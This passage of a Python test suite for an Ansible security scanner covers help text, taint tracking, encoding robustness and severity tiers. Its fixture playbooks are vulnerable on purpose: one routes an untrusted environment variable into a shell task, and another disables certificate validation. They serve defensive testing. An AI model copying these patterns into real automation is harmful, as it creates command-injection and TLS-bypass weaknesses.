    monkeypatch.setattr(sys, "argv", ["ansible-security-scanner", "--help"])

    exit_code = 0
    try:
        cli.main()
    except SystemExit as e:
        exit_code = int(e.code) if e.code is not None else 0

    captured = capsys.readouterr()
    help_text = captured.out + captured.err

    assert exit_code == 0, "--help should exit 0"
    assert "Examples:" in help_text, "help epilog should introduce examples"
    # Every workflow a CI / platform team would reach for must be
    # represented. Adding these as a set makes it obvious when
    # someone removes one accidentally.
    required_phrases = [
        "--files site.yml --output report.sarif",  # SARIF / code scanning
        "--output gl-sast-report.json",  # GitLab SAST
        "--output-per-file",  # per-file reports
        "--compliance CIS-Secrets",  # compliance filter
        "--fix",  # autofix
    ]
    for phrase in required_phrases:
        assert phrase in help_text, f"--help epilog is missing an example for {phrase!r}"
    # The description line should also name the big compliance
    # frameworks so users landing from Google see them at a glance.
    assert "OWASP" in help_text and "CIS" in help_text and "SARIF" in help_text


def test_cli_help_lists_exit_codes(monkeypatch, capsys):
    """Exit codes must be documented in ``--help``. CI engineers
    configure job-failure semantics against these numbers; undocumented
    codes lead to "why is this job passing?" support tickets.
    """
    from ansible_security_scanner import cli

    monkeypatch.setattr(sys, "argv", ["ansible-security-scanner", "--help"])

    try:
        cli.main()
    except SystemExit:
        pass
    help_text = capsys.readouterr().out

    assert "Exit codes:" in help_text
    for code in ("0", "1", "2"):
        assert f"\n  {code}" in help_text, f"exit code {code} is missing from the help epilog"


def test_taint_multihop_propagates_across_set_fact_chain(tmp_path):
    """A tainted variable passed through a chain of set_fact assignments
    propagates taint to the final LHS and fires ``cross_file_taint`` on
    the downstream sink. Regression for the engine-level multi-hop
    propagation.
    """
    play = tmp_path / "multihop.yml"
    play.write_text(
        """---
- hosts: all
  tasks:
    - name: hop 1 (direct taint)
      ansible.builtin.set_fact:
        raw_input: "{{ lookup('env', 'UNTRUSTED') }}"
    - name: hop 2 (propagate)
      ansible.builtin.set_fact:
        mid_input: "prefix-{{ raw_input }}-suffix"
    - name: hop 3 (propagate again)
      ansible.builtin.set_fact:
        final_input: "{{ mid_input }}-end"
    - name: sink should fire
      ansible.builtin.shell: "echo {{ final_input }}"
"""
    )
    # Scan the whole tmp_path so the taint tracker sees every task in
    # the same pass - matches the historical CLI semantics that relied
    # on --directory without --files.
    from ansible_security_scanner import AnsibleSecurityScanner

    data = _report_as_json(AnsibleSecurityScanner(directory=str(tmp_path)).scan_directory())
    taint_findings = [f for f in data["findings"] if f["rule_id"] == "cross_file_taint"]
    assert taint_findings, (
        "multi-hop taint should flag the shell sink reading `final_input` - "
        f"got findings: {[(f['rule_id'], f['line_number']) for f in data['findings']]}"
    )
    assert any("final_input" in f["title"] for f in taint_findings), (
        f"expected `final_input` to be the tainted variable in the finding; "
        f"got titles: {[f['title'] for f in taint_findings]}"
    )


def test_taint_cycle_without_source_does_not_flag(tmp_path):
    """A set_fact cycle with no tainted source must not fire cross_file_taint.
    Termination of the fixpoint loop is bounded; correctness is that
    neither variable in the cycle becomes tainted.
    """
    play = tmp_path / "cycle.yml"
    play.write_text(
        """---
- hosts: all
  tasks:
    - name: cycle-a (no lookup, no register)
      ansible.builtin.set_fact:
        p: "{{ q | default('x') }}-static"
    - name: cycle-b (no lookup, no register)
      ansible.builtin.set_fact:
        q: "{{ p | default('y') }}-static"
    - name: sink must NOT fire taint (no source)
      ansible.builtin.shell: "echo {{ p }} {{ q }}"
"""
    )
    from ansible_security_scanner import AnsibleSecurityScanner

    data = _report_as_json(AnsibleSecurityScanner(directory=str(tmp_path)).scan_directory())
    taint_findings = [f for f in data["findings"] if f["rule_id"] == "cross_file_taint"]
    assert not taint_findings, (
        f"cycle with no tainted source must not fire cross_file_taint; "
        f"got: {[(f['title'], f['line_number']) for f in taint_findings]}"
    )


def test_scanner_skips_non_utf8_files_without_crashing(tmp_path):
    """A binary or latin-1 .yml file in the corpus must not crash the scan.

    Repo regression: ansible-lint ships an intentionally non-UTF-8 fixture
    (`encoding.j2`) that previously raised UnicodeDecodeError out of
    `scanner._read_and_parse`, killing the entire run with a non-zero rc.
    """
    (tmp_path / "good.yml").write_text("- hosts: all\n  tasks: []\n")
    (tmp_path / "bad.yml").write_bytes(b"\xc0\xc1\xc2 not utf-8\n")

    from ansible_security_scanner import AnsibleSecurityScanner

    AnsibleSecurityScanner(directory=str(tmp_path)).scan_directory()


def test_severity_demoted_for_curated_rules_in_test_fixture_paths(tmp_path):
    """``ssl_verification_disabled`` is HIGH in a production playbook but
    one tier lower (MEDIUM) when it fires from a test-integration fixture.

    The finding remains visible - we explicitly do NOT exclude test paths -
    but it stops dominating the severity histogram on repos like
    ``ansible-core/test/integration/targets/**`` where ``validate_certs:
    no`` is intentional throw-away rig wiring.
    """
    play_body = (
        "- hosts: localhost\n"
        "  tasks:\n"
        "    - ansible.builtin.uri:\n"
        "        url: https://example.invalid\n"
        "        validate_certs: no\n"
    )

    prod = tmp_path / "roles" / "deploy" / "tasks" / "main.yml"
    prod.parent.mkdir(parents=True)
    prod.write_text(play_body)

    fixture = tmp_path / "test" / "integration" / "targets" / "uri" / "tasks" / "main.yml"
    fixture.parent.mkdir(parents=True)
    fixture.write_text(play_body)

    from ansible_security_scanner import AnsibleSecurityScanner

    data = _report_as_json(AnsibleSecurityScanner(directory=str(tmp_path)).scan_directory())
    target_rules = {"ssl_verification_disabled", "uri_module_validate_certs_false"}
    by_path = {f["file_path"]: f for f in data["findings"] if f["rule_id"] in target_rules}
    prod_finding = by_path.get(str(prod.relative_to(tmp_path)))
    fixture_finding = by_path.get(str(fixture.relative_to(tmp_path)))
    assert prod_finding is not None, f"production finding missing; got {list(by_path)}"
    assert fixture_finding is not None, f"fixture finding missing; got {list(by_path)}"
    assert prod_finding["severity"].upper() == "HIGH", prod_finding["severity"]
    assert fixture_finding["severity"].upper() == "MEDIUM", fixture_finding["severity"]


def main():
    print("=" * 60)
    print("Ansible Security Scanner - Regression Tests")
    print("=" * 60)

    all_ids = _collect_all_rule_ids()
    results = []

    print(f"\nTotal pattern IDs: {len(all_ids)}")

    # Test 1: bad_example coverage
    print("\n[1] Bad example full coverage test")
    target = TESTS_DIR / "bad_example.yml"
    if target.exists():
        data = _run_scan(target)
        triggered = {f["rule_id"] for f in data.get("findings", [])}
        missing = sorted(all_ids - triggered)
        print(f"  Triggered: {len(triggered)} / {len(all_ids)}")
        if missing:
            print(f"  MISSING ({len(missing)}):")
            for m in missing:
                print(f"    - {m}")
        ok = len(missing) == 0
        print(f"  Result: {'PASS' if ok else 'FAIL'}")
        results.append(ok)
    else:
        print(f"  SKIP - {target} not found")

    # Test 2: clean_example zero findings
    print("\n[2] Clean example zero-findings test")
    target = TESTS_DIR / "clean_example.yml"
    if target.exists():
        data = _run_scan(target)
        findings = data.get("findings", [])
        print(f"  Findings: {len(findings)}")
        if findings:
            for f in findings[:10]:
                print(f"    {f['rule_id']}: line {f['line_number']}")
        ok = len(findings) == 0
        print(f"  Result: {'PASS' if ok else 'FAIL'}")
        results.append(ok)
    else:
        print(f"  SKIP - {target} not found")

    # Test 3: no duplicate IDs
    print("\n[3] Duplicate pattern ID test")
    seen = {}
    dupes = 0
    for yml in sorted(PATTERNS_DIR.glob("*.yml")):
        data = yaml.safe_load(yml.read_text())
        for p in data.get("patterns", []):
            pid = p["id"]
            if pid in seen:
                print(f"    DUPE: {pid} in {seen[pid]} and {yml.name}")
                dupes += 1
            seen[pid] = yml.name
    print(f"  Duplicates: {dupes}")
    print(f"  Result: {'PASS' if dupes == 0 else 'FAIL'}")
    results.append(dupes == 0)

    # Test 4: all regexes compile
    print("\n[4] Regex compilation test")
    errors = 0
    for yml in sorted(PATTERNS_DIR.glob("*.yml")):
        data = yaml.safe_load(yml.read_text())
        for p in data.get("patterns", []):
            try:
                re.compile(p["regex"], re.IGNORECASE)
            except re.error as e:
                print(f"    BROKEN: {p['id']} in {yml.name}: {e}")
                errors += 1
    print(f"  Errors: {errors}")
    print(f"  Result: {'PASS' if errors == 0 else 'FAIL'}")
    results.append(errors == 0)

    # Test 5: all output formats valid
    print("\n[5] Output format validation test")
    target = TESTS_DIR / "bad_example.yml"
    if target.exists():
        format_failures = []
        for fmt, validator in FORMAT_VALIDATORS.items():
            try:
                output = _run_scan_raw(target, fmt)
                validator(output)
                print(f"    {fmt:10s} OK")
            except Exception as exc:
                print(f"    {fmt:10s} FAIL - {type(exc).__name__}: {exc}")
                format_failures.append(fmt)
        ok = not format_failures
        print(f"  Failures: {len(format_failures)}")
        print(f"  Result: {'PASS' if ok else 'FAIL'}")
        results.append(ok)
    else:
        print(f"  SKIP - {target} not found")

    print("\n" + "=" * 60)
    if all(results):
        print("ALL TESTS PASSED")
        sys.exit(0)
    else:
        print("SOME TESTS FAILED")
        sys.exit(1)


if __name__ == "__main__":
    main()
